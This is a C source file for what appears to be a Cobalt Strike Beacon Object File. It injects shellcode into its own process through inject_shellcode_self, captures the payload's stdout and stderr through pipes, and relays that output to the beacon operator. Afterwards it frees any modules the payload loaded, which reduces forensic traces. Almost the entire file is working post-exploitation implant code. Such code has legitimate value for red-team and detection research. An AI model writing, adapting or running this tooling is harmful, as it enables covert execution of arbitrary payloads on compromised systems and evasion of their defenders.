// x86_64-w64-mingw32-clang -c reflective-execution.c -D_BOF_ -o reflective-execution.o
#define WIN32_LEAN_AND_MEAN

#include <io.h>
#include <stdio.h>
#include <fcntl.h>
#include <windows.h>
#include <synchapi.h>
#include <string.h>

#define BUFFER_SIZE 1024
#define _WAIT_TIMEOUT 5000
#define ARRAY_MODULES_SIZE 1024
#define NT_FAIL(status) (status < 0)

#pragma clang diagnostic ignored "-Wnested-anon-types"
#pragma clang diagnostic ignored "-Wgnu-anonymous-struct"

#include "inject.hpp"
#include "sleep.hpp"

#ifdef _BOF_

#pragma clang diagnostic ignored "-Wmacro-redefined"
#pragma clang diagnostic ignored "-Wdollar-in-identifier-extension"
#pragma clang diagnostic ignored "-Wwritable-strings"

extern "C" {
#include "beacon.h"
}

extern "C" DECLSPEC_IMPORT WINBASEAPI VOID WINAPI KERNEL32$SetLastError(
  DWORD dwErrCode
);

#define SetLastError KERNEL32$SetLastError

extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreatePipe(
    PHANDLE               hReadPipe,
    PHANDLE               hWritePipe,
    LPSECURITY_ATTRIBUTES lpPipeAttributes,
    DWORD                 nSize
);
#define CreatePipe KERNEL32$CreatePipe

extern "C" DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetStdHandle(DWORD nStdHandle);
#define GetStdHandle KERNEL32$GetStdHandle

extern "C" DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$SetStdHandle(
    DWORD  nStdHandle,
    HANDLE hHandle
);
#define SetStdHandle KERNEL32$SetStdHandle

extern "C" DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateThread(
    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
    SIZE_T                  dwStackSize,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    __drv_aliasesMem LPVOID lpParameter,
    DWORD                   dwCreationFlags,
    LPDWORD                 lpThreadId
);
#define CreateThread KERNEL32$CreateThread

extern "C" DECLSPEC_IMPORT WINBASEAPI DWORD    WINAPI  KERNEL32$WaitForSingleObject(HANDLE, DWORD);
#define WaitForSingleObject KERNEL32$WaitForSingleObject

extern "C" DECLSPEC_IMPORT WINBASEAPI LPVOID   WINAPI  KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
#define VirtualAlloc KERNEL32$VirtualAlloc

extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
#define VirtualFree KERNEL32$VirtualFree

extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
#define VirtualProtect KERNEL32$VirtualProtect

extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$CloseHandle(HANDLE);
#define CloseHandle KERNEL32$CloseHandle

extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$AllocConsole(void);
#define AllocConsole KERNEL32$AllocConsole

extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$FreeConsole(void);
#define FreeConsole KERNEL32$FreeConsole

extern "C" DECLSPEC_IMPORT WINBASEAPI HANDLE     WINAPI  KERNEL32$CreateFileA(
  LPCSTR                lpFileName,
  DWORD                 dwDesiredAccess,
  DWORD                 dwShareMode,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  DWORD                 dwCreationDisposition,
  DWORD                 dwFlagsAndAttributes,
  HANDLE                hTemplateFile
);
#define CreateFileA KERNEL32$CreateFileA

extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$ReadFile(HANDLE, PVOID, DWORD, PDWORD, LPOVERLAPPED);
#define ReadFile KERNEL32$ReadFile

extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$PeekNamedPipe(
  HANDLE  hNamedPipe,
  LPVOID  lpBuffer,
  DWORD   nBufferSize,
  LPDWORD lpBytesRead,
  LPDWORD lpTotalBytesAvail,
  LPDWORD lpBytesLeftThisMessage
);
#define PeekNamedPipe KERNEL32$PeekNamedPipe

extern "C" DECLSPEC_IMPORT BOOL WINAPI KERNEL32$EnumProcessModules(
  HANDLE  hProcess,
  HMODULE *lphModule,
  DWORD   cb,
  LPDWORD lpcbNeeded
);
#define EnumProcessModules KERNEL32$EnumProcessModules

extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$_open_osfhandle(
   intptr_t osfhandle,
   int flags
);
#define _open_osfhandle MSVCRT$_open_osfhandle

extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$_dup2(int fd1, int fd2);
#define _dup2 MSVCRT$_dup2

extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$_dup(int fd1);
#define _dup MSVCRT$_dup

extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$_fileno(FILE *stream);
#define _fileno MSVCRT$_fileno

extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$setvbuf(
   FILE *stream,
   char *buffer,
   int mode,
   size_t size
);
#define setvbuf MSVCRT$setvbuf

extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$puts(const char *str);
#define puts MSVCRT$puts

extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$perror(const char *str);
#define perror MSVCRT$perror

extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$printf(const char * format, ...);
#define printf MSVCRT$printf

extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$fprintf(FILE *stream, const char * format, ...);
#define fprintf MSVCRT$fprintf

extern "C" DECLSPEC_IMPORT errno_t      __cdecl  MSVCRT$freopen_s(
   FILE ** stream,
   const char * fileName,
   const char * mode,
   FILE* oldStream
);
#define freopen_s MSVCRT$freopen_s

extern "C" DECLSPEC_IMPORT FILE*      __cdecl  MSVCRT$__iob_func();
#define __iob_func MSVCRT$__iob_func

// https://doxygen.reactos.org/d2/de9/acrt__iob__func_8c_source.html
extern "C" __declspec(dllexport)
FILE *__cdecl __acrt_iob_funcs(int index)
{
    return &(__iob_func()[index]);
}

#define stdin (__acrt_iob_funcs(0))
#define stdout (__acrt_iob_funcs(1))
#define stderr (__acrt_iob_funcs(2))

#endif

BOOL create_pipe(HANDLE* pipeRead, HANDLE* pipeWrite) {
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    return CreatePipe(pipeRead, pipeWrite, &sa, 0);
}

void redirect_io(FILE* hFrom, HANDLE hTo) {
    int fd = _open_osfhandle((intptr_t)hTo, _O_TEXT);
    _dup2(fd, _fileno(hFrom));
    setvbuf(hFrom, NULL, _IONBF, 0); //Disable buffering.
}

void redirect_io2(DWORD handle, HANDLE hTo) {
    SetStdHandle(handle, hTo);
}

void restore_io(int stdoutFd, int stderrFd, HANDLE stdoutHandle, HANDLE stderrHandle) {
    _dup2(stdoutFd, _fileno(stdout));
    _dup2(stderrFd, _fileno(stderr));
    SetStdHandle(STD_OUTPUT_HANDLE, stdoutHandle);
    SetStdHandle(STD_ERROR_HANDLE, stderrHandle);
}

BOOL isPresentInArray(HMODULE loadedModules[], HMODULE targetModule) {
    for (unsigned int i = 0; i < ARRAY_MODULES_SIZE; i++) {
        if (loadedModules[i] == targetModule) {
            return TRUE;
        }
    }

    return FALSE;
}

BOOL enumerateModulesAndCleanup(HMODULE loadedModules[], BOOL cleanup) {
    HMODULE hMods[ARRAY_MODULES_SIZE * sizeof(HMODULE)];
    DWORD cbNeeded = -1;
    BOOL wasLibraryFreed = FALSE;

    __stosb(hMods, 0, ARRAY_MODULES_SIZE * sizeof(HMODULE));

    if (cleanup) {
        if (EnumProcessModules((HANDLE)-1 /*GetCurrentProcess()*/, hMods, ARRAY_MODULES_SIZE * sizeof(HMODULE), &cbNeeded)) {
            for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
                /*
                TCHAR szModName[MAX_PATH];

                if (GetModuleFileNameEx( hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR))) {
                    _tprintf( TEXT("\t%s (0x%08X)\n"), szModName, hMods[i] );
                }
                */
               if (!isPresentInArray(loadedModules, hMods[i])) {
                   FreeLibrary(hMods[i]);
                   wasLibraryFreed = TRUE;
               }
            }
        }
    } else {
        EnumProcessModules((HANDLE)-1 /*GetCurrentProcess()*/, loadedModules, ARRAY_MODULES_SIZE * sizeof(HMODULE), &cbNeeded);
    }

    return wasLibraryFreed;
}

BOOL CreateConsole() {
    if (!AllocConsole()) {
        // Add some error handling here.
        // You can call GetLastError() to get more info about the error.
        return FALSE;
    }

    // std::cout, std::clog, std::cerr, std::cin
    FILE* fDummy;
    freopen_s(&fDummy, "CONOUT$", "w", stdout);
    freopen_s(&fDummy, "CONOUT$", "w", stderr);
    //freopen_s(&fDummy, "CONIN$", "r", stdin);

    // std::wcout, std::wclog, std::wcerr, std::wcin
    HANDLE hConOut = CreateFileA(TEXT("CONOUT$"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    //HANDLE hConIn = CreateFile(_T("CONIN$"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    SetStdHandle(STD_OUTPUT_HANDLE, hConOut);
    SetStdHandle(STD_ERROR_HANDLE, hConOut);
    //SetStdHandle(STD_INPUT_HANDLE, hConIn);
    return TRUE;
}

#ifndef _BOF_
DWORD WINAPI hello_world(LPVOID lpParam) {
    puts("Hello World!\n");
    perror("Welp\n");
    for (int i = 0; i < 1024; i++) {
        printf("%d - ", i);
    }

    return 0;
}
#endif

extern "C" __declspec(dllexport)
int go(char * args, int alen) {
    HANDLE stdoutHandle = INVALID_HANDLE_VALUE;
    HANDLE stderrHandle = INVALID_HANDLE_VALUE;
    HANDLE pipeReadOutput = INVALID_HANDLE_VALUE;
    HANDLE pipeWriteOutput = INVALID_HANDLE_VALUE;
    HANDLE pipeReadError = INVALID_HANDLE_VALUE;
    HANDLE pipeWriteError = INVALID_HANDLE_VALUE;
    int stdoutFd = -1;
    int stderrFd = -1;
    int readResult = -1;
    DWORD waitResult = -1;
    BOOL isThreadFinished = FALSE;
    BOOL wasConsoleCreated = FALSE;
    unsigned char recvBuffer[BUFFER_SIZE];
    DWORD bytesRead = 0;
    DWORD remainingDataOutput = 0;
    DWORD remainingDataError = 0;
    HMODULE loadedModules[ARRAY_MODULES_SIZE * sizeof(HMODULE)];

    #ifdef SYSCALLS
    my_init_syscalls_list();
    #endif

    #ifdef _BOF_
    BeaconPrintf(CALLBACK_OUTPUT, "Starting BOF...");
    #endif

    __stosb(loadedModules, 0, ARRAY_MODULES_SIZE * sizeof(HMODULE));
    enumerateModulesAndCleanup(loadedModules, FALSE);

    stdoutHandle = GetStdHandle(STD_OUTPUT_HANDLE);
    stderrHandle = GetStdHandle(STD_ERROR_HANDLE);
    stdoutFd = _dup(_fileno(stdout));
    stderrFd = _dup(_fileno(stderr));
    wasConsoleCreated = CreateConsole();
    //puts("Before redir\n");
    create_pipe(&pipeReadOutput, &pipeWriteOutput);
    create_pipe(&pipeReadError, &pipeWriteError);
    redirect_io(stdout, pipeWriteOutput);
    //redirect_io2(STD_OUTPUT_HANDLE, pipeWriteOutput);
    redirect_io(stderr, pipeWriteError);
    //redirect_io2(STD_ERROR_HANDLE, pipeWriteError);

    #ifndef _BOF_
    DWORD dwThreadId = -1;
    HANDLE hThread = CreateThread(
        NULL,           // default security attributes
        0,              // use default stack size
        hello_world,    // thread function name
        NULL,           // argument to thread function
        0,              // use default creation flags
        &dwThreadId);   // returns the thread identifier
    #else
    HANDLE hThread = INVALID_HANDLE_VALUE;
    NTSTATUS status = inject_shellcode_self(buf, buf_size, &hThread, FALSE, 0);
    if (NT_FAIL(status) || hThread == (HANDLE)-1) {
        restore_io(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
        #ifdef _BOF_
        BeaconPrintf(CALLBACK_ERROR, "inject_shellcode_self: ERROR 0x%x", status);
        printf("inject_shellcode_self: ERROR 0x%x", status);
        #else
        printf("inject_shellcode_self: ERROR 0x%x", status);
        #endif
        return status;
    }
    #endif

    //fprintf(stderr, "before do, buf_size = %d\n", buf_size);

    do {
        waitResult = WaitForSingleObject(hThread, _WAIT_TIMEOUT);
        //perror("after wait for single object\n");
        switch (waitResult) {
        case WAIT_ABANDONED:
            restore_io(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
            perror("WAIT_ABANDONED\n");
            //return -1;
            break;
        case WAIT_FAILED:
            restore_io(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
            perror("WAIT_FAILED\n");
            break;
            //return -1;
        case _WAIT_TIMEOUT:
            break;
        case WAIT_OBJECT_0:
            isThreadFinished = TRUE;
        }

        //perror("before peeknamedpipe 1\n");
        PeekNamedPipe(pipeReadOutput, NULL, 0, NULL, &remainingDataOutput, NULL);
        //fprintf(stderr, "[DEBUG] remainingDataOutput = %d\n", remainingDataOutput);
        if (remainingDataOutput) {
            SetLastError(0);
            __stosb(recvBuffer, 0, BUFFER_SIZE);
            bytesRead = 0;
            readResult = ReadFile(
                pipeReadOutput,        // pipe handle
                recvBuffer,      // buffer to receive reply
                BUFFER_SIZE - 1, // size of buffer
                &bytesRead,      // number of bytes read
                NULL);           // not overlapped

            if (!readResult) {
                restore_io(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
                //printf("ERROR ReadFile: %d, GLE=%lu\n", readResult, GetLastError());
                return -1;
            }

            recvBuffer[BUFFER_SIZE - 1] = '\0';
            #ifdef _BOF_
            BeaconPrintf(CALLBACK_OUTPUT, "%s", recvBuffer);
            #endif
            //perror("[DEBUG] Received by pipe:\n");
            //perror(recvBuffer);
        }

        //perror("before peeknamedpipe 2\n");
        PeekNamedPipe(pipeReadError, NULL, 0, NULL, &remainingDataError, NULL);
        //fprintf(stderr, "[DEBUG] remainingDataOutput = %d\n", remainingDataOutput);
        if (remainingDataError) {
            SetLastError(0);
            __stosb(recvBuffer, 0, BUFFER_SIZE);
            bytesRead = 0;
            readResult = ReadFile(
                pipeReadError,        // pipe handle
                recvBuffer,      // buffer to receive reply
                BUFFER_SIZE - 1, // size of buffer
                &bytesRead,      // number of bytes read
                NULL);           // not overlapped

            if (!readResult) {
                restore_io(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
                //printf("ERROR ReadFile: %d, GLE=%lu\n", readResult, GetLastError());
                return -1;
            }

            recvBuffer[BUFFER_SIZE - 1] = '\0';
            #ifdef _BOF_
            BeaconPrintf(CALLBACK_ERROR, "%s", recvBuffer);
            #endif
            //perror("[DEBUG] Received by pipe:\n");
            //perror(recvBuffer);
        }
    } while (!isThreadFinished || remainingDataOutput || remainingDataError);
    restore_io(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
    //perror("after restore io\n");
    //perror("[DEBUG] Received last by pipe:\n");
    //perror((const char *)recvBuffer);
    if (wasConsoleCreated) {
        CloseHandle(GetStdHandle(STD_OUTPUT_HANDLE));
        CloseHandle(GetStdHandle(STD_ERROR_HANDLE));
        FreeConsole();
    }

    CloseHandle(pipeWriteOutput);
    CloseHandle(pipeReadOutput);
    CloseHandle(pipeWriteError);
    CloseHandle(pipeReadError);

    if (enumerateModulesAndCleanup(&loadedModules, TRUE)) {
        // some modules were freed

    }

    //perror("before return\n");
    return 0;
}
